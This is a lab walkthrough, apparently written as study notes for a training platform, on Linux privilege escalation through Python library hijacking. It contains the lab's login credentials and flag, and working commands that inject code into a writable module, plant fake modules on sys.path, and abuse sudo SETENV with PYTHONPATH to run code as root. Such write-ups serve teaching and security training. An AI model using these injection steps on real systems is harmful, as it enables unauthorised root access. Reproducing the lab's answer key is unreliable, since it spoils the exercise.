# Section 22 — Python Library Hijacking

> Lab: `ACADEMY-LLPE-PYHIJACK` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/flag.txt` via Python library hijacking | **`HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}`** |

Injected code into the writable `psutil/__init__.py` module → ran `mem_status.py` via sudo as root → flag.

---

## Concept

Python scripts import modules at runtime. If you can control **which module gets loaded** (or modify the module itself), your code runs with the script's privileges. Three vectors:

| Vector | Requirement |
|--------|-------------|
| **1. Writable module** | The `.py` file of an imported module is writable by you |
| **2. Library path hijack** | A higher-priority directory in `sys.path` is writable — drop a fake module there |
| **3. PYTHONPATH env var** | sudo allows `SETENV:` — set PYTHONPATH to your dir with a fake module |

---

## Identify

```bash
# Check sudo — can we run python scripts as root?
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
# Look for SETENV: → enables PYTHONPATH injection

# Read the script — what does it import?
cat ~/mem_status.py
# import psutil

# Where is the module installed?
pip3 show psutil | grep Location
# /usr/local/lib/python3.8/dist-packages

# Is the module file writable?
ls -la /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--r-- 1 htb-student staff ... ← writable by us!

# Check Python's import search order
python3 -c 'import sys; print("\n".join(sys.path))'
# Higher paths searched first — writable dir above the module = hijackable

# Any writable dirs in sys.path?
ls -ld /usr/lib/python3.8 /usr/local/lib/python3.8/dist-packages /usr/lib/python3/dist-packages
```

---

## Vector 1 — Writable Module (This Lab)

The imported module file is directly writable → inject code into the function the script calls.

```bash
# Find which function is called
cat ~/mem_status.py                         # psutil.virtual_memory()

# Find the function in the module
grep -n "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# line 1920

# Backup the module
cp /usr/local/lib/python3.8/dist-packages/psutil/__init__.py /tmp/psutil_backup.py

# Inject code at the top of virtual_memory()
python3 -c "
f = open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py', 'r')
content = f.read(); f.close()
content = content.replace(
    'def virtual_memory():',
    'def virtual_memory():\n    import os; os.system(\"cat /root/flag.txt\")'
)
f = open('/usr/local/lib/python3.8/dist-packages/psutil/__init__.py', 'w')
f.write(content); f.close()
"

# Run the script as root
sudo /usr/bin/python3 /home/htb-student/mem_status.py
# HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
```
> `sed -i` may fail if you can write the file but not create temp files in its directory. Use python's own file I/O to modify in-place.

---

## Vector 2 — Library Path Hijack

A directory higher in `sys.path` than the real module is writable → create a fake module.

```bash
# sys.path order:
# /usr/lib/python3.8              ← if writable, this is checked BEFORE
# /usr/local/lib/python3.8/dist-packages  ← where psutil actually lives

# Check if higher-priority dir is writable
ls -ld /usr/lib/python3.8
# drwxr-xrwx  ← world-writable = exploitable

# Create fake psutil.py in the higher-priority dir
cat > /usr/lib/python3.8/psutil.py << 'PY'
import os
def virtual_memory():
    os.system('cat /root/flag.txt')
PY

# Run
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```
> The fake module must have the **same name** as the import and implement the **same function** with the correct number of arguments.

---

## Vector 3 — PYTHONPATH Environment Variable

Sudo allows `SETENV:` → set PYTHONPATH to redirect module imports.

```bash
# sudo -l shows:
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

# Create fake module in /tmp
cat > /tmp/psutil.py << 'PY'
import os
def virtual_memory():
    os.system('cat /root/flag.txt')
PY

# Run with PYTHONPATH pointing to /tmp
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
> `SETENV:` in sudoers = you can set any env var for the sudo command. PYTHONPATH prepends your dir to the search path → your fake module loads first.

---

## Exam / Engagement Notes

- **`sudo -l` is king.** Look for: python script as root, `SETENV:` flag, `env_keep+=PYTHONPATH`.
- **Read the script first** — identify what it imports and which functions it calls.
- **Check module permissions**: `ls -la $(python3 -c "import psutil; print(psutil.__file__)")` — writable = direct injection.
- **Check sys.path order**: any writable directory above the real module = path hijack.
- **Fake modules must match**: same filename as the import, same function names, same argument count.
- **Always backup** before modifying a real module — `cp module.py /tmp/backup.py`.
- **`sed -i` fails** if you can write the file but not create temp files in its parent dir. Use python file I/O instead.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (HTB_@cademy_stdnt!)
2. sudo -l -> (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
   cat mem_status.py -> import psutil ; psutil.virtual_memory()
3. ls -la /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
   -> owned by htb-student (writable!)
4. Inject: import os; os.system("cat /root/flag.txt") at top of virtual_memory()
5. sudo /usr/bin/python3 /home/htb-student/mem_status.py
   -> HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}      ✅
```

> One line: sudo runs python script as root → imported module is writable → inject code into called function → root execution.
